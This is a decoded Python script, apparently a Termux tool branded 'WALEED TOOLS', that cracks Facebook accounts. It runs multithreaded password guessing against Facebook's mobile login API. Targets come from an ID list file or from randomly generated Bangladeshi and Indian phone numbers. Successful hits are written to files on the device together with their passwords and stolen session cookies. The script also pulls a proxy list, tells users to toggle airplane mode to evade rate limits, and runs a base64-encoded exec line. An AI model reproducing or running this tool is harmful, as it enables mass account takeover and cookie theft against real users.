#ASSALAMUALAIKUM 
#DECODE BY MUHAMMAD HAMZA 
#SHAPATAR_BACHA
import os
import zlib
import concurrent.futures
import urllib.request
import re
import platform
import sys
import random
import subprocess
import threading
import itertools
import base64
import uuid
import json
import shutil
import webbrowser
import time
import datetime
import string
from concurrent.futures import ThreadPoolExecutor
from random import randint
from time import sleep as slp

try:
    import requests
except ImportError:
    print('\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING REQUESTS ')
    os.system('espeak -a 300 "INSTALLING REQUESTS,"')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING FUTURES ')
    os.system('espeak -a 300 "INSTALLING FUTURES ,"')
    os.system('pip install futures')

try:
    import mECH
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')


os.system('pkg install espeak')
os.system('clear')
print('\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] WELCOME TO WALEED TOOLS')
os.system('espeak -a 300 "WELCOME, TO, WALEED, KING, TOOLS,"')


totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total = []
methods = []
srange = 0
saved = []
filter = []
loop = 0
ok = []
cp = []
user = []
cok = []
plist = []

try:
    proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    with open('socksku.txt', 'w') as f:
        f.write(proxylist)
except Exception as e:
    pass

proxsi = open('socksku.txt', 'r').read().splitlines()

exec(base64.b64decode(b'c3lzLnN0ZG91dC53cml0ZSgnXHgxYl0yO/CflLAgWFlMT04g8J+UsFx4MDcnKQ=='))

head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}

A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

logo = f"""
 \x1b[1;32m
ââââââââââââââ     ââââââââ
ââââââââââââââ     ââââââââ
ââââââ  ââââââ     ââââââ
ââââââ  ââââââ     ââââââ
âââ     âââââââââââââââââââ
âââ     âââââââââââââââââââ

{A}âââââââââââââââââââââââââââââââââââââââââââââ
{R}({G1}ð§ð©{R}) {G1}DEVELOPER  {R}â   {G2} WALEED~KING
{R}({G1}ð§ð©{R}) {G1}GITHUB     {R}â   {Y} BROTH3RS TEAM
{R}({G1}ð§ð©{R}) {G1}TOOLS      {R}â   {G2} FILE RANDAM
{R}({G1}ð§ð©{R}) {G1}VERSION    {R}â   {Y} V2.6
{A}âââââââââââââââââââââââââââââââââââââââââââââ
"""

def clear():
    os.system('clear')
    print(logo)

def linex():
    print(f'{A}ââââââââââââââââââââââââââââââââââââââââââââââââââ')

def result(OKs, cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r{A}ââââââââââââââââââââââââââââââââââââââââââââââââââ')
        print(f'{G1}[{A}={G1}] THE PROCESS HAS BEEN COMPLETE...')
        print(f'{G1}[{A}={G2}] TOTAL OK {A}:{G2} %s' % str(len(oks)))
        print(f'{G1}[{A}={G2}] TOTAL CP {A}:{G3} %s' % str(len(cps)))
        print(f'\r{A}ââââââââââââââââââââââââââââââââââââââââââââââââââ')
        input(f'{G1}[{A}={G4}] PRESS ENTER TO BACK MENU ')
        exit()

def menu():
    clear()
    print(f'{G1}[{A}1{G1}] FILE CLONING')
    print(f'{G1}[{A}2{G2}] RANDOM CLONING')
    print(f'{G1}[{A}3{G3}] CONTACT TOOL OWNER')
    print(f'{G1}[{A}0{G4}] EXIT TOOLS')
    linex()
    select = input(f'{G1}[{A}?{G5}] CHOICE {A}:{G5} ')
    if select == '1':
        _file_()
    elif select == '2':
        _randm_()
    elif select == '3':
        os.system('xdg-open https://chat.whatsapp.com/HIRRKKdxyQZKT14GM9dohr?mode=ac_t ')
        menu()
    elif select == '0':
        exit(f'{G1}[{A}={G1}] EXIT DONE ')
    else:
        print(f'{G1}[{A}={G2}] VALID OPTION')
        time.sleep(2)
        menu()

def _randm_():
    clear()
    print(f'{G1}[{A}1{G1}] BANGLADESH CLONING')
    print(f'{G1}[{A}2{G2}] INDIA CLONING')
    print(f'{G1}[{A}0{G3}] BACK TO MAIN MENU')
    linex()
    select = input(f'{G1}[{A}?{G5}] CHOICE {A}:{G5} ')
    if select == '1':
        _bd_()
    elif select == '2':
        _India_()
    elif select == '0':
        menu()
    else:
        print(f'{G1}[{A}={G2}] VALID OPTION')
        time.sleep(2)
        _randm_()

def _bd_():
    clear()
    print(f'{G1}[{A}={G1}] EXAMPLE {A}:{G1} 017{A}/{G1}019{A}/{G1}018{A}/{G1}016')
    linex()
    code = input(f'{G1}[{A}?{G2}] CHOICE  {A}:{G2} ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'{G1}[{A}={G3}] EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999')
    linex()
    limit = int(input(f'{G1}[{A}?{G4}] CHOICE  {A}:{G4} '))
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPoolExecutor(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}={G1}] SIM CODE  {A}:{G1} {code}')
        print(f'{G1}[{A}={G2}] TOTAL UID {A}:{G2} {str(len(user))}')
        print(f'{G1}[{A}={G3}] TURN {G3}[{A}ON{A}/{A}OFF{G3}] AIRPLANE MODE EVERY {A}3{G3} MIN')
        linex()
        for love in user:
            ids = code + name + cod + love
            psd = [code + name + cod + love, cod + love, name + love, code + name + cod, 'bangladesh', 'Bangladesh']
            sexy.submit(randm, ids, psd)
    print()
    print(f'\r{A}ââââââââââââââââââââââââââââââââââââââââââââââââââ')
    print(f'{G1}[{A}={G1}] THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}={G2}] TOTAL OK ID {A}:{G2} {str(len(ok))}')
    print(f'{G1}[{A}={G3}] TOTAL CP ID {A}:{G3} {str(len(cp))}')
    print(f'\r{A}ââââââââââââââââââââââââââââââââââââââââââââââââââ')
    input(f'{G1}[{A}={G4}] PRESS ENTER TO BACK ')
    menu()

def _India_():
    clear()
    print(f'{G1}[{A}={G1}] EXAMPLE {A}:{G1} +91639{A}/{G1}+91934{A}/{G1}+91902{A}/{G1}+91701')
    linex()
    code = input(f'{G1}[{A}?{G2}] CHOICE  {A}:{G2} ')
    clear()
    print(f'{G1}[{A}={G3}] EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999')
    linex()
    limit = int(input(f'{G1}[{A}?{G4}] CHOICE  {A}:{G4} '))
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPoolExecutor(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}={G1}] SIM CODE  {A}:{G1} {code}')
        print(f'{G1}[{A}={G2}] TOTAL UID {A}:{G2} {str(len(user))}')
        print(f'{G1}[{A}={G3}] TURN {G3}[{A}ON{A}/{A}OFF{G3}] AIRPLANE MODE EVERY {A}3{G3} MIN')
        linex()
        for love in user:
            ids = code + love
            psd = [love, ids[3:], '57273200', '59039200', '57575751']
            sexy.submit(randm, ids, psd)
    print()
    print(f'\r{A}ââââââââââââââââââââââââââââââââââââââââââââââââââ')
    print(f'{G1}[{A}={G1}] THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}={G2}] TOTAL OK ID {A}:{G2} {str(len(ok))}')
    print(f'{G1}[{A}={G3}] TOTAL CP ID {A}:{G3} {str(len(cp))}')
    print(f'\r{A}ââââââââââââââââââââââââââââââââââââââââââââââââââ')
    input(f'{G1}[{A}={G4}] PRESS ENTER TO BACK ')
    menu()

def _file_():
    clear()
    print(f'{G1}[{A}1{G1}] METHOD {G1}[{A}M1{G1}] ')
    print(f'{G1}[{A}2{G2}] METHOD {G2}[{A}M2{G2}] ')
    linex()
    option = input(f'{G1}[{A}?{G3}] CHOICE {A}:{G3} ')
    if option == '1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option == '2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option == '0':
        _file_()
    else:
        print(f'{G1}[{A}={G2}] VALID OPTION')
        time.sleep(2)
        _file_()

class main_crack:
    def __init__(self):
        self.id = []

    def crack(self, id):
        clear()
        print(f'{G1}[{A}={G1}] EXAMPLE {A}:{G1} /sdcard/AKASH .txt')
        linex()
        self.file = input(f'{G1}[{A}?{G2}] FILE NAME {A}:{G2} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{G1}[{A}={G2}] OPPS FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f'{G1}[{A}={G2}] TRY AGAIN ...')
            time.sleep(2)
            main_crack().crack(id)

    def methodA(self, sid, name, psw):
        global loop
        ua = f"[FBAN/FB4A;FBAV/{str(random.randint(11, 77))}.0.0.{str(random.randrange(9, 49))}{str(random.randint(11, 77))};FBBV/{str(random.randint(1111111, 7777777))};'[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{{density=2.25,width=720,height=1400}};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Robi;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
        sys.stdout.write(f'\r{G1}[{A}AKASH -M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ')
        sys.stdout.flush()
        try:
            fs = name.split(' ')[0]
            ls = name.split(' ')[1]
        except:
            fs = name
            ls = fs
        for pw in psw:
            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', name).replace('name', name.lower())
            with requests.Session() as session:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': sid,
                    'password': ps,
                    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                q = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                    print(f'\r\r{G1}[WALEED -OK] {sid} | {ps} ')
                    open('/sdcard/WALEED -M1-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f'\r\r{M}[WALEED -CP] {sid} | {ps} ')
                    open('/sdcard/WALEED -M2-FILE-OK.txt', 'a').write(sid + '|' + ps + '\n')
                    cps.append(sid)
                    break
                else:
                    continue
        loop += 1
        return

    def methodB(self, sid, name, psw):
        global loop
        sys.stdout.write(f'\r{G1}[{A}WALEED -M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ')
        sys.stdout.flush()
        try:
            fs = name.split(' ')[0]
            ls = name.split(' ')[1]
        except:
            fs = name
            ls = fs
        for pw in psw:
            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', name).replace('name', name.lower())
            with requests.Session() as session:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': sid,
                    'password': ps,
                    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                headers = {
                    'User-Agent': '[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/Robi;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX2021;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                q = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                    print(f'\r\r{G1}[WALEED -OK] {sid} | {ps} ')
                    open('/sdcard/WALEED -M2-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f'\r\r{M}[WALEED -CP] {sid} | {ps} ')
                    open('/sdcard/WALEED XD -M2-FILE-OK.txt', 'a').write(sid + '|' + ps + '\n')
                    cps.append(sid)
                    break
                else:
                    continue
            loop += 1
            return

    def pasw(self):
        pw = []
        clear()
        print(f'{G1}[{A}={G2}] EXAMPLE {A}:{G2} BD 10-18/INDIA 3-5')
        linex()
        sl = int(input(f'{G1}[{A}?{G3}] PASSWORD LIMIT {A}:{G3} '))
        clear()
        print(f'{G1}[{A}?{G4}] EXAMPLE {A}:{G4} first123/firstlast/first@@@')
        linex()
        if sl == '':
            print(f'{G1}[{A}={G5}] PUT LIMIT BETWEEN 1 TO 30')
        elif sl > 20:
            print(f'{G1}[{A}={G1}] PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
        else:
            for sr in range(sl):
                pw.append(input(f'{G1}[{A}={G1}] PASSWORD NO {G1}[{A}{sr+1}{G1}] {A}:{G1} '))
        clear()
        print(f'{G1}[{A}={G1}] TOTAL FILE UID {A}:{G1} %s ' % len(self.id))
        print(f'{G1}[{A}={G2}] PASSWORD LIMIT {A}:{G1} {sl} ')
        print(f'{G1}[{A}={G3}] TURN {G3}[{A}ON{A}/{A}OFF{G3}] AIRPLANE MODE EVERY {A}3{G3} MIN')
        linex()
        with ThreadPoolExecutor(max_workers=30) as swagworld:
            for zsb in self.id:
                try:
                    uid, name = zsb.split('|')
                    sz = name.split(' ')
                    if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                        pwx = pw
                    else:
                        pwx = pw
                    if 'methodA' in methods:
                        swagworld.submit(self.methodA, uid, name, pwx)
                    elif 'methodB' in methods:
                        swagworld.submit(self.methodB, uid, name, pwx)
                except:
                    pass
        result(oks, cps)

def randm(ids, psd):
    global loop, ok, cp
    sys.stdout.write(f'\r{G1}[{A}WALEED -{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            head = {
                'User-Agent': '[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(2000, 4000)),
                'X-FB-SIM-HNI': str(random.randint(2000, 4000)),
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=head, allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f'\r\r{G1}[WALEED -OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{A} {coki}')
                open('/sdcard/WALEEDX -OK.txt', 'a').write(uid + '|' + pas + '|' + coki + '\n')
                ok.append(uid)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        return

K1 = str(os.getuid())
K2 = str(os.getgid())
num_key = 'WALEED'.join(K1 + K2).upper()
from io import BytesIO
import pycurl
import certifi

def apv():
    url = 'https://raw.githubusercontent.com/MR-AKASH-404/Key1/refs/heads/main/Key1.txt'
    try:
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax = buffer.getvalue().decode('utf-8')
        if num_key in datax:
            menu()
        else:
            clear()
            print(' [â] Key Not Approved')
            print(' !! Key - ' + num_key)
            os.system('termux-open https://chat.whatsapp.com/HIRRKKdxyQZKT14GM9dohr?mode=ac_t ')
            sys.exit()
    except Exception as e:
        print(e)
        sys.exit('[!!] Internet Error...')

if __name__ == '__main__':
    menu()
